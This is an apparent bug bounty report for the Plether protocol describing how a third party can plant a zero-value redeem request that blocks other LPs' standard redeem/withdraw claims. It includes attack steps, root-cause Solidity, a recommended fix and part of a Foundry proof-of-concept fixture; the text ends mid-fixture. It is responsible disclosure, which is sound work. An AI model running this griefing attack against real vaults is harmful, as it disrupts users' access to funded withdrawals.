# \#99329 [SC-Low] A third party can plant a zero-value redeem request at the head of any LP's queue, breaking the standard `redeem`/`withdraw` claim path for that LP

**Submitted on Nov 13th 2026 at 07:14:37 UTC by @tomX0 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99329
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

## Summary

Each tranche vault keeps a per-controller queue of redeem requests, and the ERC-4626 claim functions (`redeem`, `withdraw`) and their views (`maxRedeem`, `maxWithdraw`) only ever look at the head of that queue. Two other rules make the head attackable:

- `requestRedeem(shares, controller, owner)` authorises the owner of the shares, not the controller, so anyone can open a request in someone else's name.
- A request for the owner's entire balance is exempt from the 1 USDG minimum request size.

Together they let anyone holding one share atom send it to a fresh address and call `requestRedeem(1, victim, fresh)`. That 1-share request becomes the victim's queue head. It is worth nothing, so settlement refunds it instead of funding it. From then on the victim's funded redemptions are invisible to `maxRedeem`/`maxWithdraw`, and `redeem`/`withdraw` revert, until the victim clears the planted request themselves.

It costs the attacker 1 share atom (worth 0 USDG) and about 190k gas per victim. It needs nothing from the victim, hits many LPs in one transaction, and can be repeated after every clean-up. Junior and Senior use the same code. No funds are lost: the explicit-id `claimRedeem(requestId, ...)` still pays.

## Severity

Low: Contract fails to deliver promised returns, but doesn't lose value.

The docs promise this claim path. `CANONICAL_ENTRYPOINTS.md` says funded requests are "claimed through ERC-4626 `redeem` or `withdraw`", and `ACCOUNTING_SPEC.md` says `maxWithdraw` and `maxRedeem` "expose only funded claim capacity". After a plant they expose nothing even though the request is funded. I'm not claiming a freeze or a loss, because the explicit-id claim pays at once.

## Affected code

Line numbers are for `packages/perps/src` at commit [`a82d4fe`](https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src).

- `TrancheVault.sol#L606-L632`: `requestRedeem`, controller never checked
- `TrancheVault.sol#L1611-L1618`: `_requireMinimumRedeemSize`, full-balance exemption
- `TrancheVault.sol#L1783-L1797`: `_appendControllerRedeem`, first entry becomes the head
- `TrancheVault.sol#L998-L1012` and `#L1299-L1311`: `withdraw`/`redeem` and `maxWithdraw`/`maxRedeem` act on the head only
- `TrancheVault.sol#L916-L947`: `claimRedeemRefund`, controller-only, restarts the receiver's cooldown
- `HousePool.sol#L960-L986`: zero-value epoch refund

## Root cause

**1. The controller is never checked, and a full-balance request skips the minimum.**

```solidity
uint256 maxShares = maxRequestRedeem(owner);
...
_requireMinimumRedeemSize(shares, maxShares);
if (msg.sender != owner && !isOperator[owner][msg.sender]) {
    _spendAllowance(owner, msg.sender, shares);
}
_transfer(owner, address(this), shares);
requestId = _enqueueRedeemRequest(shares, controller); // any controller
```

```solidity
if (estimateRedeemAssets(shares) < POOL.minTrancheDepositAssets() && shares < maxShares) {
    revert TrancheVault__WithdrawalTooSmall();
}
```

An address holding exactly 1 share atom has `shares == maxShares == 1`, so the request goes through for whatever controller it names.

**2. The first entry on an empty queue becomes the head** (`#L1789-L1791`):

```solidity
uint256 tail = controllerRedeemTail[controller];
if (tail == 0) {
    controllerRedeemHead[controller] = requestId;
```

**3. Standard claims and views only read the head** (`#L1003`, `#L1011`, `#L1302`, `#L1309`):

```solidity
return _claimWithdraw(controllerRedeemHead[controller], assets, receiver, controller);
return _claimRedeem(controllerRedeemHead[controller], shares, receiver, controller);
uint256 requestId = controllerRedeemHead[controller]; // maxWithdraw / maxRedeem
```

**4. The planted head has nothing claimable.** An hourly epoch that holds only zero-value requests takes the `fullHeadAssets == 0` branch in `HousePool` and is refunded, so `fundedShares` stays 0 and both `claimableRedeemRequest` and `claimableRedeemAssets` return 0. `_claimRedeem` and `_claimWithdraw` then revert with `ERC4626ExceededMaxRedeem(controller, x, 0)` and `ERC4626ExceededMaxWithdraw(controller, x, 0)`. If an honest redeemer happens to share the window, the plant is funded instead, but its assets floor to 0, so `withdraw` stays blocked and `redeem(1)` burns it for nothing.

**5. Only the victim can clear it, and doing so restarts the victim's cooldown.** A refunded position leaves the queue only after `claimRedeemRefund` (`#L1222-L1225`). That function is controller/operator-only and sets `lastDepositTime[receiver] = block.timestamp` before handing over the refunded share (`#L942-L944`). Cooldown is per account, so it covers the victim's whole wallet for 1 hour. Cancelling before settlement does the same (`#L911`).

## Attack path

1. The attacker deposits the 1 USDG minimum into the Junior vault and, after the permissionless `HousePool.settleLpEpoch(0, 0)`, claims 1,000,694,481 share atoms.
2. After its 1-hour cooldown, the attacker moves one atom to a fresh address (or a helper contract), which inherits the elapsed cooldown (`#L329-L331`).
3. The fresh address calls `requestRedeem(1, victim, fresh)`. A helper contract can repeat this for a list of victims in one transaction.
4. Settlement refunds the plant.
5. The victim later requests a redemption as usual, and the next settlement funds it.
6. `maxRedeem(victim)` and `maxWithdraw(victim)` return 0, and `redeem`/`withdraw` revert.

The plant has to land in an earlier hourly window than the victim's next request (in the same window it just merges into the victim's position as a 1-share gift). If the victim already has queued requests, the plant sits behind them and becomes the head once they're claimed. It persists until cleared, so it can be placed long in advance.

## Impact

Figures are from the PoC at release parameters.

**An LP using an EOA**

- 4,999,999,999 USDG atoms (about 5,000 USDG) are funded and sitting in escrow, but `maxRedeem` and `maxWithdraw` return 0, `redeem` reverts with `ERC4626ExceededMaxRedeem(victim, reqShares, 0)` and `withdraw` with `ERC4626ExceededMaxWithdraw(victim, funded, 0)`.
- `claimRedeem(requestId, ...)` pays the full amount without touching the cooldown, but the plant stays and the standard views keep showing 0.
- Clearing it with `claimRedeemRefund` while holding wallet shares hands the victim the attacker's share and locks 5,003,472,406,423 share atoms (about 5,000 USDG) for 3,600 s. `transfer` reverts at +3,599 s and the wallet unlocks at +3,600 s. Funded USDG claims aren't affected.
- The victim can avoid the lock by requesting the whole wallet first, then reclaiming, then calling `redeem`. That pays 9,999,999,999 in one block, and the cooldown then only covers the refunded atom.
- After a clean-up, one more share atom hides the next funded request again. A plant behind an existing request leaves that request alone, then hides the next one.

**Many LPs at once.** One helper contract planted 50 addresses in a single transaction at 189,536 gas per plant (measured inside the contract, with no test overhead). One real LP among them later had its funded 4,999,999,999 atoms hidden in the same way. The attacker's 1 USDG deposit holds enough atoms for about a billion plants, so gas is the only limit.

**A holder that claims only through the standard surface (illustration only).** A small contract written for this report claims with `redeem(maxRedeem)` / `withdraw(maxWithdraw)`. Its 9,999,999,999 funded atoms stay unreachable through all four standard functions at 1 h, 24 h and 365 days. An identical control contract with no plant is paid in full by the same code, and no third party can clear the head. No first-party contract claims this way, so I'm not counting this toward severity.

**Cost.** One share atom per victim (`convertToAssets(1) == 0`) plus gas. No attacker profit and no victim loss. What breaks is the documented claim path, `max*`-based tooling, and the victim's ability to undo the plant without an unsolicited share and a cooldown restart.

## What is intended and what isn't

Some pieces of this are by design, and they aren't what I'm reporting:

- **Naming another controller** is allowed by ERC-7540, and the interface NatSpec says request authorisation "follows ERC-7540 owner approval rules". On its own that only lets someone hand an LP a redeem request, which is harmless if the request is claimable.
- **Head-only standard claims**, and the need to reclaim a refundable head before they advance, are documented in `IAsyncTrancheVault`. That text describes a controller's own refunded request.
- **The full-balance dust exit** is documented in `SECURITY.md` and the interface ("redeeming this owner's entire available balance permits dust exits") as a way for an owner to leave with its own dust.

The bug is the combination. The dust exemption lets a stranger create a request that is guaranteed to be non-claimable, and head-only claims let that request block another account's later, real redemptions. No doc says a third party can do this. Clearing it also hands the victim an unsolicited share and restarts its cooldown, which the same NatSpec says the `receiver == controller` rule exists to prevent ("share delivery cannot impose another account's cooldown").

Plether's own app claims by request id, so its users can still withdraw. They would see an unexplained 1-share refundable request, and reclaiming it from the app restarts their cooldown. The direct breakage is for anything that uses the standard ERC-7540 surface the integration guide documents, such as integrators, aggregators and tooling that reads `max*`.

## Relationship to known issues

- **Cecuro LOW-39 / LOW-40 (addressed).** Dust blocking another controller's share-receiver flows, and share delivery forcing a cooldown on another account. The fix made share-delivering claims require `receiver == controller`. This report reaches a similar outcome through an entry point that fix didn't touch: the unchecked `controller` on `requestRedeem`.
- **Cecuro LOW-67 (accepted).** A dust holder's own shares burned for 0 assets. Same rounding, but it only affects the holder's own request, not another account's queue.
- **Cecuro MED-24 (known).** Zero-payout epochs using up the settlement work budget. Same 1-share primitive, different harm: global settlement progress versus one controller's claim path.
- **Cecuro LOW-43** (which address `max*` takes) and **SC Audit Studio SC-H2** (zero-amount withdraw resetting another LP's cooldown, fixed) are different mechanisms. The AI scan report has no matching entry.
- No repository test makes a redeem request with `controller != owner`, and no upstream commit discusses it.

## Recommended fix

The smallest change gives the full-balance exemption only to self-controlled requests:

```solidity
// TrancheVault.requestRedeem
_requireMinimumRedeemSize(shares, controller == owner ? maxShares : type(uint256).max);
```

A request for someone else then has to be worth at least `minTrancheDepositAssets()`, so it can't be refunded as zero-value or floor to 0. It arrives as a claimable gift that `redeem(maxRedeem)` / `withdraw(maxWithdraw)` pay out and move past, and it's no longer free. ERC-7540's controller semantics are unchanged.

I applied this change locally. Every plant in the PoC, including the batched one, reverts with `TrancheVault__WithdrawalTooSmall`. An owner's own 1-share exit and an above-minimum third-party request still work, and all 238 repository LP spec tests pass.

Alternatives: require the controller's consent when `controller != owner` (`msg.sender == controller || isOperator[controller][msg.sender]`), or, as defence in depth, have `redeem`, `withdraw`, `maxRedeem` and `maxWithdraw` skip head positions with nothing claimable.



## Proof of Concept

## Proof of concept

`PocBase.sol` is a fixture built on the repository's `BasePerpTest`. It applies the release values through the normal owner timelocks in `setUp`, funds LPs through the public ERC-7540 path, and re-checks every release value with `_assertReleaseParams()` in each test. After `setUp` only fresh addresses act, settlement goes through the public `HousePool.settleLpEpoch(0, 0)`, and there's no `vm.store`, no `deal` on protocol contracts and no privileged prank.

Run from the repository root at the commit in scope:

```bash
mkdir -p packages/perps/test/perps/poc
# save both files below into that folder
FOUNDRY_PROFILE=quick forge test --root packages/perps --match-path test/perps/poc/RedeemHeadPlant.t.sol -vvv
```

The tests:

- `test_eoaVictim_standardClaimsRevert_explicitIdClaimPays`: standard claims revert for a planted EOA, and the explicit-id claim still pays.
- `test_eoaVictim_reclaimRestartsWalletCooldown_andPlantRepeats`: clearing the plant locks the wallet for 1 hour, and a second plant hides the next request.
- `test_plantBehindExistingRequest_blocksNextRequest`: a plant behind a queued request takes over once that request is claimed.
- `test_documentedRecovery_requestWholeWalletThenReclaim`: the recovery order that avoids the lock.
- `test_massPlant_oneTransactionBlindsManyLps`: 50 plants in one transaction, then a real LP's funded request is hidden.
- `test_refundedPlantedHead_blocksStandardOnlyIntegrator`: the standard-surface holder illustration, against an identical control.

Expected output (trimmed):

```
[PASS] test_documentedRecovery_requestWholeWalletThenReclaim()
  recovery: paid via reclaim + standard redeem in one block 9999999999
[PASS] test_eoaVictim_reclaimRestartsWalletCooldown_andPlantRepeats()
  victim wallet share atoms locked by the cooldown 5003472406423
[PASS] test_eoaVictim_standardClaimsRevert_explicitIdClaimPays()
  EOA explicit claimRedeem(requestId) USDG atoms 4999999999
[PASS] test_massPlant_oneTransactionBlindsManyLps()
  addresses planted in one transaction 50
  gas per plant inside the helper (no cheatcodes) 189536
  victim funded USDG atoms hidden after the mass plant 4999999999
[PASS] test_plantBehindExistingRequest_blocksNextRequest()
[PASS] test_refundedPlantedHead_blocksStandardOnlyIntegrator()
  victim integrator funded USDG atoms unreachable via ERC-7540/4626 9999999999
  control integrator USDG atoms paid through the same code 9999999999
Suite result: ok. 6 passed; 0 failed; 0 skipped
```

<details>
<summary><code>PocBase.sol</code> (click to expand)</summary>

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {ICfdEngineRiskParamsView} from "@plether/perps/interfaces/ICfdEngineRiskParamsView.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

abstract contract PocBase is BasePerpTest {

    uint256 internal constant REL_VPI_FACTOR = 0.01e18;
    uint256 internal constant REL_MAX_SKEW_RATIO = 0.4e18;
    uint256 internal constant REL_MAINT_MARGIN_BPS = 10;
    uint256 internal constant REL_INIT_MARGIN_BPS = 20;
    uint256 internal constant REL_FAD_MARGIN_BPS = 300;
    uint256 internal constant REL_BASE_CARRY_BPS = 500;
    uint256 internal constant REL_MIN_BOUNTY_ASSETS = 1e6;
    uint256 internal constant REL_BOUNTY_BPS = 10;
    uint256 internal constant REL_KEEPER_SHARE_BPS = 5000;
    uint256 internal constant REL_PROTOCOL_SHARE_BPS = 0;

    uint256 internal constant REL_EXECUTION_FEE_BPS = 4;
    uint256 internal constant REL_SETTLEMENT_BUFFER_BPS = 25;
    uint256 internal constant REL_FROZEN_CLOSE_SPREAD_BPS = 50;
    uint256 internal constant REL_CAP_PRICE = 2e8;
    uint256 internal constant REL_SIZE_QUANTUM = 1e20;
    uint256 internal constant REL_FAD_RUNWAY_SECONDS = 1 hours;
    uint256 internal constant REL_FAD_MAX_STALENESS = 3 days;
    uint256 internal constant REL_ENGINE_MARK_STALENESS = 60;

    uint256 internal constant REL_BASKET_MAX_CONF_RATIO_BPS = 10;
    uint256 internal constant REL_ADVERSE_CONF_MULTIPLIER_BPS = 2500;
    uint256 internal constant REL_ORDER_STALENESS = 60;
    uint256 internal constant REL_LIQUIDATION_STALENESS = 15;
    uint256 internal constant REL_ORDER_SETTLEMENT_WINDOW = 15;
    uint256 internal constant REL_MAX_COMPONENT_DIVERGENCE = 5;

    uint256 internal constant REL_MIN_OPEN_NOTIONAL_ASSETS = 1000e6;
    uint256 internal constant REL_MAX_PENDING_ORDERS = 5;
    uint256 internal constant REL_PROTECTION_TRIGGER_BOUNTY_ASSETS = 200_000;
    uint256 internal constant REL_OPEN_BOUNTY_BPS = 1;
    uint256 internal constant REL_MIN_OPEN_BOUNTY_ASSETS = 10_000;
    uint256 internal constant REL_MAX_OPEN_BOUNTY_ASSETS = 200_000;
    uint256 internal constant REL_MAX_EXECUTION_WINDOW_SECONDS = 60;
    uint256 internal constant REL_MIN_ENGINE_GAS = 600_000;
    uint256 internal constant REL_MAX_PRUNE_ORDERS = 64;

    uint256 internal constant REL_MAX_SENIOR_EXPOSURE_ASSETS = 40_000_000e6;
    uint256 internal constant REL_MAX_SENIOR_SHARE_BPS = 8000;
    uint256 internal constant REL_SENIOR_RATE_BPS = 800;
    uint256 internal constant REL_POOL_MARK_STALENESS = 60;
    uint256 internal constant REL_SENIOR_FROZEN_LP_FEE_BPS = 25;
    uint256 internal constant REL_JUNIOR_FROZEN_LP_FEE_BPS = 75;
    uint256 internal constant REL_JUNIOR_MAINTENANCE_FEE_APR_BPS = 0;
    uint256 internal constant REL_SEED_ASSETS = 1e6;

    address internal pocKeeper;
    address internal pocJuniorLp;
    uint256 internal pocPrice;

    mapping(address => mapping(bool => uint256)) internal pocLastDepositRequest;

    function _riskParams() internal pure virtual override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: REL_VPI_FACTOR,
            maxSkewRatio: REL_MAX_SKEW_RATIO,
            maintMarginBps: REL_MAINT_MARGIN_BPS,
            initMarginBps: REL_INIT_MARGIN_BPS,
            fadMarginBps: REL_FAD_MARGIN_BPS,
            baseCarryBps: REL_BASE_CARRY_BPS,
            minBountyAssets: REL_MIN_BOUNTY_ASSETS,
            bountyBps: REL_BOUNTY_BPS,
            keeperShareBps: REL_KEEPER_SHARE_BPS,
            protocolShareBps: REL_PROTOCOL_SHARE_BPS
        });
    }

    function _initialJuniorDeposit() internal pure virtual override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure virtual override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure virtual override returns (uint256) {
        return REL_SEED_ASSETS;
    }

    function _initialSeniorSeedDeposit() internal pure virtual override returns (uint256) {
        return REL_SEED_ASSETS;
    }

    function _pocInitialJuniorLpAssets() internal pure virtual returns (uint256) {
        return 1_000_000e6;
    }

    function _pocDefaultPrice() internal pure virtual returns (uint256) {
        return 1.2e8;
    }

    function _pocPythFeeWei() internal pure virtual returns (uint256) {
        return 1;
    }

    function setUp() public virtual override {
        super.setUp();

        assertEq(pool.seniorPrincipal(), REL_SEED_ASSETS, "release Senior seed");
        assertEq(pool.juniorPrincipal(), REL_SEED_ASSETS, "release Junior seed");
        assertTrue(pool.isTradingActive(), "trading active after seeds");

        pocKeeper = _pocActor("pocKeeper");
        pocJuniorLp = _pocActor("pocJuniorLp");

        _pocApplyReleaseConfig();

        _pocWarpToWeekdayHourUtc(9);
        baseMockPyth.setFee(_pocPythFeeWei());

        uint256 price = _pocDefaultPrice();
        _setPrice(price);
        _updateMark(pocKeeper, price);

        uint256 juniorAssets = _pocInitialJuniorLpAssets();
        if (juniorAssets > 0) {
            uint256 requestId = _lpRequestDeposit(pocJuniorLp, false, juniorAssets);
            _warpToLpEpoch(requestId);
            _settleLpEpochPublic(pocKeeper);
            assertGt(_lpClaimShares(pocJuniorLp, false), 0, "setUp Junior shares");
        }

        _setPrice(price);
        _updateMark(pocKeeper, price);
        assertFalse(_isFadOrFrozen(), "setUp must end outside FAD / frozen windows");

        _assertReleaseParams();
    }

    function _pocApplyReleaseConfig() internal {
        uint256 readyAt = vm.getBlockTimestamp();

        bool poolChange;
        IHousePool.PoolConfig memory poolConfig = _currentPoolConfig();
        if (
            poolConfig.maxSeniorExposureAssets != REL_MAX_SENIOR_EXPOSURE_ASSETS
                || poolConfig.maxSeniorShareBps != REL_MAX_SENIOR_SHARE_BPS
                || poolConfig.seniorRateBps != REL_SENIOR_RATE_BPS
                || poolConfig.markStalenessLimit != REL_POOL_MARK_STALENESS
                || poolConfig.seniorFrozenLpFeeBps != REL_SENIOR_FROZEN_LP_FEE_BPS
                || poolConfig.juniorFrozenLpFeeBps != REL_JUNIOR_FROZEN_LP_FEE_BPS
        ) {
            poolConfig.maxSeniorExposureAssets = REL_MAX_SENIOR_EXPOSURE_ASSETS;
            poolConfig.maxSeniorShareBps = REL_MAX_SENIOR_SHARE_BPS;
            poolConfig.seniorRateBps = REL_SENIOR_RATE_BPS;
            poolConfig.markStalenessLimit = REL_POOL_MARK_STALENESS;
            poolConfig.seniorFrozenLpFeeBps = REL_SENIOR_FROZEN_LP_FEE_BPS;
            poolConfig.juniorFrozenLpFeeBps = REL_JUNIOR_FROZEN_LP_FEE_BPS;
            pool.proposePoolConfig(poolConfig);
            readyAt = _pocMax(readyAt, pool.poolConfigActivationTime());
            poolChange = true;
        }

        bool routerChange;
        IOrderRouterAdminHost.RouterConfig memory routerConfig = _routerConfig();
        if (
            routerConfig.minOpenNotionalAssets != REL_MIN_OPEN_NOTIONAL_ASSETS
                || routerConfig.adverseConfidenceMultiplierBps != REL_ADVERSE_CONF_MULTIPLIER_BPS
                || routerConfig.basketMaxConfidenceRatioBps != REL_BASKET_MAX_CONF_RATIO_BPS
                || routerConfig.maxPendingOrders != REL_MAX_PENDING_ORDERS
                || routerConfig.positionProtectionTriggerBountyAssets != REL_PROTECTION_TRIGGER_BOUNTY_ASSETS
        ) {
            routerConfig.minOpenNotionalAssets = REL_MIN_OPEN_NOTIONAL_ASSETS;
            routerConfig.adverseConfidenceMultiplierBps = REL_ADVERSE_CONF_MULTIPLIER_BPS;
            routerConfig.basketMaxConfidenceRatioBps = REL_BASKET_MAX_CONF_RATIO_BPS;
            routerConfig.maxPendingOrders = REL_MAX_PENDING_ORDERS;
            routerConfig.positionProtectionTriggerBountyAssets = REL_PROTECTION_TRIGGER_BOUNTY_ASSETS;
            routerAdmin.proposeRouterConfig(routerConfig);
            readyAt = _pocMax(readyAt, routerAdmin.routerConfigActivationTime());
            routerChange = true;
        }

        bool riskChange;
        ICfdEngineAdminHost.EngineRiskConfig memory riskConfig = _engineRiskConfig();
        if (
            riskConfig.executionFeeBps != REL_EXECUTION_FEE_BPS
                || riskConfig.settlementBufferBps != REL_SETTLEMENT_BUFFER_BPS
                || riskConfig.frozenCloseSpreadBps != REL_FROZEN_CLOSE_SPREAD_BPS
                || keccak256(abi.encode(riskConfig.riskParams)) != keccak256(abi.encode(_riskParams()))
        ) {
            riskConfig.riskParams = _riskParams();
            riskConfig.executionFeeBps = REL_EXECUTION_FEE_BPS;
            riskConfig.settlementBufferBps = REL_SETTLEMENT_BUFFER_BPS;
            riskConfig.frozenCloseSpreadBps = REL_FROZEN_CLOSE_SPREAD_BPS;
            engineAdmin.proposeRiskConfig(riskConfig);
            readyAt = _pocMax(readyAt, engineAdmin.riskConfigActivationTime());
            riskChange = true;
        }

        bool calendarChange;
        if (engine.fadRunwaySeconds() != REL_FAD_RUNWAY_SECONDS) {
            ICfdEngineAdminHost.EngineCalendarConfig memory calendarConfig;
            calendarConfig.fadDayTimestamps = new uint256[](0);
            calendarConfig.fadRunwaySeconds = REL_FAD_RUNWAY_SECONDS;
            engineAdmin.proposeCalendarConfig(calendarConfig);
            readyAt = _pocMax(readyAt, engineAdmin.calendarConfigActivationTime());
            calendarChange = true;
        }

        bool maintenanceFeeChange;
        if (juniorVault.maintenanceFeeAprBps() != REL_JUNIOR_MAINTENANCE_FEE_APR_BPS) {
            juniorVault.proposeMaintenanceFeeConfig(REL_JUNIOR_MAINTENANCE_FEE_APR_BPS, engine.protocolTreasury());
            readyAt = _pocMax(readyAt, juniorVault.maintenanceFeeConfigActivationTime());
            maintenanceFeeChange = true;
        }

        if (readyAt > vm.getBlockTimestamp()) {
            vm.warp(readyAt + 1);
            vm.roll(vm.getBlockNumber() + 1);
        }
        if (poolChange) {
            pool.finalizePoolConfig();
        }
        if (routerChange) {
            routerAdmin.finalizeRouterConfig();
        }
        if (riskChange) {
            engineAdmin.finalizeRiskConfig();
        }
        if (calendarChange) {
            engineAdmin.finalizeCalendarConfig();
        }
        if (maintenanceFeeChange) {
            juniorVault.finalizeMaintenanceFeeConfig();
        }
    }

    function _pocWarpToWeekdayHourUtc(
        uint256 hourUtc
    ) internal {
        uint256 nowTs = vm.getBlockTimestamp();
        uint256 day = nowTs / 1 days;
        uint256 target = day * 1 days + hourUtc * 1 hours;
        if (target < nowTs) {
            day += 1;
            target += 1 days;
        }
        while (((day + 4) % 7) == 0 || ((day + 4) % 7) >= 5) {
            day += 1;
            target += 1 days;
        }
        _pocWarpTo(target);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _assertReleaseParams() internal view {
        CfdTypes.RiskParams memory rp = ICfdEngineRiskParamsView(address(engine)).riskParams();
        assertEq(rp.vpiFactor, REL_VPI_FACTOR, "rel: vpiFactor");
        assertEq(rp.maxSkewRatio, REL_MAX_SKEW_RATIO, "rel: maxSkewRatio");
        assertEq(rp.maintMarginBps, REL_MAINT_MARGIN_BPS, "rel: maintMarginBps");
        assertEq(rp.initMarginBps, REL_INIT_MARGIN_BPS, "rel: initMarginBps");
        assertEq(rp.fadMarginBps, REL_FAD_MARGIN_BPS, "rel: fadMarginBps");
        assertEq(rp.baseCarryBps, REL_BASE_CARRY_BPS, "rel: baseCarryBps");
        assertEq(rp.minBountyAssets, REL_MIN_BOUNTY_ASSETS, "rel: minBountyAssets");
        assertEq(rp.bountyBps, REL_BOUNTY_BPS, "rel: bountyBps");
        assertEq(rp.keeperShareBps, REL_KEEPER_SHARE_BPS, "rel: keeperShareBps");
        assertEq(rp.protocolShareBps, REL_PROTOCOL_SHARE_BPS, "rel: protocolShareBps");

        assertEq(engine.executionFeeBps(), REL_EXECUTION_FEE_BPS, "rel: executionFeeBps");
        assertEq(engine.settlementBufferBps(), REL_SETTLEMENT_BUFFER_BPS, "rel: settlementBufferBps");
        assertEq(engine.frozenCloseSpreadBps(), REL_FROZEN_CLOSE_SPREAD_BPS, "rel: frozenCloseSpreadBps");
        assertEq(engine.fadRunwaySeconds(), REL_FAD_RUNWAY_SECONDS, "rel: fadRunwaySeconds");
        assertEq(engine.fadMaxStaleness(), REL_FAD_MAX_STALENESS, "rel: fadMaxStaleness");
        assertEq(engine.engineMarkStalenessLimit(), REL_ENGINE_MARK_STALENESS, "rel: engineMarkStalenessLimit");
        assertEq(engine.CAP_PRICE(), REL_CAP_PRICE, "rel: engine CAP_PRICE");
        assertEq(uint256(terminalNavBook.CAP_PRICE()), REL_CAP_PRICE, "rel: book CAP_PRICE");
        assertEq(terminalNavBook.SIZE_QUANTUM(), REL_SIZE_QUANTUM, "rel: book SIZE_QUANTUM");
        assertEq(CfdTypes.SIZE_QUANTUM, REL_SIZE_QUANTUM, "rel: CfdTypes.SIZE_QUANTUM");
        assertEq(address(engine.orderRouter()), address(router), "rel: engine router");
        assertEq(address(engine.pool()), address(pool), "rel: engine pool");

        assertEq(router.minOpenNotionalAssets(), REL_MIN_OPEN_NOTIONAL_ASSETS, "rel: minOpenNotionalAssets");
        assertEq(router.maxPendingOrders(), REL_MAX_PENDING_ORDERS, "rel: maxPendingOrders");
        assertEq(
            router.positionProtectionTriggerBountyAssets(),
            REL_PROTECTION_TRIGGER_BOUNTY_ASSETS,
            "rel: positionProtectionTriggerBountyAssets"
        );
        assertEq(router.openOrderExecutionBountyBps(), REL_OPEN_BOUNTY_BPS, "rel: openOrderExecutionBountyBps");
        assertEq(
            router.minOpenOrderExecutionBountyAssets(), REL_MIN_OPEN_BOUNTY_ASSETS, "rel: minOpenOrderExecutionBounty"
        );
        assertEq(
            router.maxOpenOrderExecutionBountyAssets(), REL_MAX_OPEN_BOUNTY_ASSETS, "rel: maxOpenOrderExecutionBounty"
        );
        assertEq(router.maxExecutionWindowSeconds(), REL_MAX_EXECUTION_WINDOW_SECONDS, "rel: maxExecutionWindow");
        assertEq(router.minEngineGas(), REL_MIN_ENGINE_GAS, "rel: minEngineGas");
        assertEq(router.maxPruneOrdersPerCall(), REL_MAX_PRUNE_ORDERS, "rel: maxPruneOrdersPerCall");

        IPletherOracle oracle = router.pletherOracle();
        assertEq(address(oracle), address(pletherOracle), "rel: router oracle");
        assertEq(oracle.adverseConfidenceMultiplierBps(), REL_ADVERSE_CONF_MULTIPLIER_BPS, "rel: adverse multiplier");
        assertEq(oracle.basketMaxConfidenceRatioBps(), REL_BASKET_MAX_CONF_RATIO_BPS, "rel: basket confidence");
        assertEq(oracle.orderExecutionStalenessLimit(), REL_ORDER_STALENESS, "rel: order staleness");
        assertEq(oracle.liquidationStalenessLimit(), REL_LIQUIDATION_STALENESS, "rel: liquidation staleness");
        assertEq(oracle.orderSettlementWindow(), REL_ORDER_SETTLEMENT_WINDOW, "rel: order settlement window");
        assertEq(
            oracle.maxComponentPublishTimeDivergence(), REL_MAX_COMPONENT_DIVERGENCE, "rel: component divergence"
        );
        assertEq(baseMockPyth.mockFee(), _pocPythFeeWei(), "poc: mock Pyth fee");

        assertEq(pool.maxSeniorExposureAssets(), REL_MAX_SENIOR_EXPOSURE_ASSETS, "rel: maxSeniorExposureAssets");
        assertEq(pool.maxSeniorShareBps(), REL_MAX_SENIOR_SHARE_BPS, "rel: maxSeniorShareBps");
        assertEq(pool.seniorRateBps(), REL_SENIOR_RATE_BPS, "rel: seniorRateBps");
        assertEq(pool.markStalenessLimit(), REL_POOL_MARK_STALENESS, "rel: pool markStalenessLimit");
        assertEq(pool.seniorFrozenLpFeeBps(), REL_SENIOR_FROZEN_LP_FEE_BPS, "rel: senior frozen LP fee");
        assertEq(pool.juniorFrozenLpFeeBps(), REL_JUNIOR_FROZEN_LP_FEE_BPS, "rel: junior frozen LP fee");
        assertTrue(pool.isTradingActive(), "rel: trading active");
        assertTrue(pool.isSeedLifecycleComplete(), "rel: seeds initialized");

        assertEq(juniorVault.maintenanceFeeAprBps(), REL_JUNIOR_MAINTENANCE_FEE_APR_BPS, "rel: junior maintenance fee");
        assertEq(seniorVault.maintenanceFeeAprBps(), 0, "rel: senior maintenance fee");
        assertEq(_initialJuniorSeedDeposit(), REL_SEED_ASSETS, "rel: junior seed");
        assertEq(_initialSeniorSeedDeposit(), REL_SEED_ASSETS, "rel: senior seed");
        assertEq(juniorVault.seedReceiver(), address(this), "rel: junior seed receiver");
        assertEq(seniorVault.seedReceiver(), address(this), "rel: senior seed receiver");
        assertGt(juniorVault.seedShareFloor(), 0, "rel: junior seed floor");
        assertGt(seniorVault.seedShareFloor(), 0, "rel: senior seed floor");

        assertEq(pool.poolConfigActivationTime(), 0, "rel: no pending pool proposal");
        assertEq(routerAdmin.routerConfigActivationTime(), 0, "rel: no pending router proposal");
        assertEq(routerAdmin.oracleConfigActivationTime(), 0, "rel: no pending oracle proposal");
        assertEq(engineAdmin.riskConfigActivationTime(), 0, "rel: no pending risk proposal");
        assertEq(engineAdmin.calendarConfigActivationTime(), 0, "rel: no pending calendar proposal");
        assertEq(engineAdmin.freshnessConfigActivationTime(), 0, "rel: no pending freshness proposal");
        assertEq(juniorVault.maintenanceFeeConfigActivationTime(), 0, "rel: no pending maintenance fee proposal");
        assertFalse(routerAdmin.paused(), "rel: router not paused");
        assertEq(uint256(routerAdmin.riskOffOrderCutoff()), 0, "rel: no risk-off cutoff");
        assertFalse(pool.paused(), "rel: pool not paused");
